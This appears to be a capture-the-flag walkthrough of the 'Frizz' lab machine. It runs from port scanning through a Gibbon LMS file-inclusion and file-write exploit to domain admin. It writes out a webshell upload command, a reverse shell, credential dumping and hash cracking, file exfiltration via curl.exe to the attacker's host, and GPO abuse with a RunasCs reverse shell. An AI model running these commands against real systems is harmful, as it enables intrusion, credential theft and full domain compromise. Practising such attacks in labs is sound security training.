1, Recon
port scan
```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-18 12:00:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-18T12:00:46
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s

```

By checking the `whatweb`
```
whatweb http://frizzdc.frizz.htb/home/  

http://frizzdc.frizz.htb/home/ [200 OK] Apache[2.4.58], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12], IP[10.10.11.60], JQuery, Modernizr[2.6.2.min], OpenSSL[3.1.3], PHP[8.2.12], Script, Title[Education &mdash; Walkerville Elementary School], X-UA-Compatible[IE=edge]

```
Page check 
![](images/Pasted%20image%2020250318160450.png)
By click the login button, we can redirect to the login page of the CMS
![](images/Pasted%20image%2020250318160532.png)
Then we can get the version of this CMS from the bottom of this page
`Powered by [Gibbon](https://gibbonedu.org) v25.0.00 | © [Ross Parker](http://rossparker.org) 2010-2025`

By searching this version of service, we can find a LFI exploit from github
`Gibbon v25.0.0 - Local File Inclusion - CVE-2023-34598`
By following the poc of this exploit, we can also check the gibbon.sql
`http://frizzdc.frizz.htb/Gibbon-LMS/?q=gibbon.sql`
![](images/Pasted%20image%2020250318161056.png)
And also the version of installed package  `http://frizzdc.frizz.htb/Gibbon-LMS/?q=/vendor/composer/installed.json`
![](images/Pasted%20image%2020250318161538.png)

```
And it seems gibbon.sql is not our database, because this string "(00322, 'System Admin', 'composerLockHash', 'Composer Update Required', '', 'fe4abccf405facac24e05de854d764a6')" is the same as in github. Just a dummy file.
```

By using fuzz to find something interesting here.
```
Interesting files from LFI:

./export.php            [Status: 403, Size: 0, Words: 1, Lines: 1, Duration: 519ms]                                                                         
./privacyPolicy.php    [Status: 200, Size: 18991, Words: 7548, Lines: 322, Duration: 2383ms]                                                               
./roleSwitcherProcess.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2997ms]                                                                       
./gibbon.sql            [Status: 200, Size: 511704, Words: 54887, Lines: 8962, Duration: 2001ms]                                                             
./notificationsActionProcess.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3418ms]                                                               
./login.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3470ms]                                                                         
./passwordReset.php    [Status: 200, Size: 22782, Words: 9545, Lines: 399, Duration: 3377ms]                                                               
./composer.json        [Status: 200, Size: 21471, Words: 8180, Lines: 406, Duration: 3432ms]                                                               
./yearSwitcherProcess.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3803ms]                                                                       
./index_parentPhotoUploadProcess.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3961ms]                                                           
./robots.txt            [Status: 200, Size: 18547, Words: 7362, Lines: 319, Duration: 3937ms]                                                               
./notificationsDeleteProcess.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4057ms]                                                               
./error.php            [Status: 200, Size: 21336, Words: 8128, Lines: 368, Duration: 4001ms]                                                               
./index_notification_ajax_alarm_tickUpdate.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1177ms]                                                 
./LICENSE              [Status: 200, Size: 53600, Words: 13171, Lines: 989, Duration: 4003ms]
./.htaccess            [Status: 200, Size: 19125, Words: 7441, Lines: 338, Duration: 1711ms]
./README.md            [Status: 200, Size: 21375, Words: 7649, Lines: 357, Duration: 4172ms]
./functions.php        [Status: 500, Size: 2845, Words: 771, Lines: 54, Duration: 846ms]
./report.php            [Status: 200, Size: 23280, Words: 8738, Lines: 383, Duration: 996ms]
./index_fastFinder_ajax.php [Status: 200, Size: 80, Words: 16, Lines: 1, Duration: 913ms]
./composer.lock        [Status: 200, Size: 312852, Words: 132641, Lines: 8420, Duration: 4049ms]
./update.php            [Status: 200, Size: 19153, Words: 7399, Lines: 331, Duration: 4465ms]
./CHANGELOG.txt        [Status: 200, Size: 121522, Words: 30030, Lines: 1772, Duration: 1097ms]
./gibbon_demo.sql      [Status: 200, Size: 1272976, Words: 61546, Lines: 11922, Duration: 1047ms]
./fullscreen.php        [Status: 500, Size: 2845, Words: 771, Lines: 54, Duration: 6673ms]

```

In this place, we can find the upload directory, so that means there is a path to upload a file, and also we can use LFI exploit to run the shell script.

By searching `gibbon edu Arbitrary file writer` from google, we can find 
`usd-2023-0025 | Arbitrary File Write`
`https://herolab.usd.de/security-advisories/usd-2023-0025/`

From the poc, we get a import information: The Rubrics module has a file rubrics_visualise_saveAjax.php (source )which can be accessed without being authenticated.
Then we firstly make a webshell of php, then follow the poc upload this webshell
```
curl -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -H "Host: frizzdc.frizz.htb" --data-urlencode "img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4K" --data-urlencode "path=shell.php" --data-urlencode "gibbonPersonID=0000000001"
```
![](images/Pasted%20image%2020250318164800.png)
Then we can use `https://www.revshells.com/` to get the reverse shell here.
![](images/Pasted%20image%2020250318165615.png)
Then we can get the reverse shell back.
```
PS C:\xampp\htdocs\Gibbon-LMS> whoami
frizz\w.webservice
```

Let's continue to enumerate the users
```
PS C:\xampp\htdocs\Gibbon-LMS> net user

User accounts for \\FRIZZDC

-------------------------------------------------------------------------------
a.perlstein              Administrator            c.ramon                  
c.sandiego               d.hudson                 f.frizzle                
g.frizzle                Guest                    h.arm                    
J.perlstein              k.franklin               krbtgt                   
l.awesome                m.ramon                  M.SchoolBus              
p.terese                 r.tennelli               t.wright                 
v.frizzle                w.li                     w.Webservice             
The command completed successfully.
```
And we might be able to leverage the following information about the Administrator
```
PS C:\xampp\htdocs\Gibbon-LMS> net user Administrator
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/25/2025 2:24:10 PM
Password expires             Never
Password changeable          2/25/2025 2:24:10 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   3/18/2025 3:37:28 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Admins        *Domain Users         
                             *Group Policy Creator *Schema Admins        
                             *Enterprise Admins    
The command completed successfully.
```

Let's continue to check the config file
```
PS C:\xampp\htdocs\Gibbon-LMS> type config.php
<?php
/*
Gibbon, Flexible & Open School System
Copyright (C) 2010, Ross Parker

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

/**
 * Sets a globally unique id, to allow multiple installs on a single server.
 */
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';

/**
 * Sets system-wide caching factor, used to balance performance and freshness.
 * Value represents number of page loads between cache refresh.
 * Must be positive integer. 1 means no caching.
 */
$caching = 10;

```

We have gotten the valid credit of database, so we can try to get the other's credit by accessing to database.
Firstly, we need to redirect to `C:\xampp\mysql\bin` to get the path of  `mysql.exe`
Then we can try to check the hashes.
```
.\mysql.exe -h localhost -u MrGibbonsDB "-pMisterGibbs!Parrot!?1" -Bse "show databases;"
gibbon
information_schema
test

.\mysql.exe -h localhost -u MrGibbonsDB "-pMisterGibbs!Parrot!?1" -Bse "use gibbon;show tables;"

.\mysql.exe -h localhost -u MrGibbonsDB "-pMisterGibbs!Parrot!?1" -Bse "use gibbon;DESC gibbonperson;"
username        varchar(20)     NO      UNI     NULL
passwordStrong  varchar(255)    NO              NULL
passwordStrongSalt      varchar(255)    NO              NULL
passwordForceReset      enum('N','Y')   NO              N

.\mysql.exe -h localhost -u MrGibbonsDB "-pMisterGibbs!Parrot!?1" -Bse "use gibbon;select * from gibbonperson;"

0000000001      Ms.     Frizzle Fiona   Fiona   Fiona Frizzle           Unspecified     f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03       /aACFhikmNopqrRTVz2489   N       Full    Y       001     001     NULL    f.frizzle@frizz.htb     NULL    NULL    ::1     2024-10-29 09:28:59     NULL    NULL    0              NULL             NULL    NULL    NULL                                                    Y       Y       N       NULL                            NULL    NULL    NULL    NULL   NULL     NULL                            Y       NULL    NULL    NULL
```

Then  we finally get the hash here, let's try to crack it to switch into `f.frizzle`
`067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23`
The password is `Jenni_Luvs_Magic23`

We need to get the Kerberos ticket to allow us to ssh or evil-winrm
```
krb5.conf

[libdefaults]
default_realm = FRIZZ.HTB
dns_lookup_realm = false
dns_lookup_kdc = true
ticket_lifetime = 24h
renew_lifetime = 7d
forwardable = true
proxiable = true
clockskew = 300

[realms]
FRIZZ.HTB = {
kdc = frizzdc.frizz.htb
admin_server = frizzdc.frizz.htb
default_domain = frizz.htb
}

[domain_realm]
.frizz.htb = FRIZZ.HTB
frizz.htb = FRIZZ.HTB

sudo ntpdate 10.10.11.60

getTGT.py frizz.htb/f.frizzle

export KRB5CCNAME=f.frizzle.ccache

ssh f.frizzle@10.10.11.60

This work for me
```

Then we can get the shell as `f.frizzle`
By enumerating the file system of this machine, we can find something interesting from the `Recycle Bin`
```
PS C:\$RECYCLE.BIN> Get-ChildItem -Recurse -Force

    Directory: C:\$RECYCLE.BIN

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
-a-hs          10/29/2024  7:31 AM            129 desktop.ini

```

There is 2 zip file here, we need to download them into our machine.
Because of I use the ssh shell, not the evil-winrm shell, so I need to upload the zip files into my local machine.
```
Copy-Item -Path "C:\`$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\`$IE2XMEG.7z" -Destination "C:\Users\f.frizzle"

curl.exe -F "files=@C:\Users\f.frizzle\`$IE2XMEG.7z" http://10.10.16.3:8080/upload

in the local machine
python3 -m uploadserver 8080
```

Then  we can successfully get the password of `"M.SchoolBus" : '!suBcig@MehTed!R' `
Let's continue to do what we have done for ssh before
```
sudo ntpdate 10.10.11.60

getTGT.py frizz.htb/M.SchoolBus

export KRB5CCNAME=M.SchoolBus.ccache

ssh M.SchoolBus@10.10.11.60
```

Then we can get the shell as `M.SchoolBus`

To get the root shell
We need to use 2 tools for here
`https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe`
and 
`https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip`
```
# get root
New-GPO -Name "doesnotmatter"

#add newlink to domain controllers
New-GPLink -Name "doesnotmatter" -Target "OU=Domain Controllers,DC=frizz,DC=htb"

#add m.schoolbus to localadmin group
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName doesnotmatter

#force group policy update
gpupdate /force

#send yourself a revshell with admin rights:
.\RunasC.exe "M.SchoolBus" '!suBcig@MehTed!R' powershell.exe -r IP:9001
```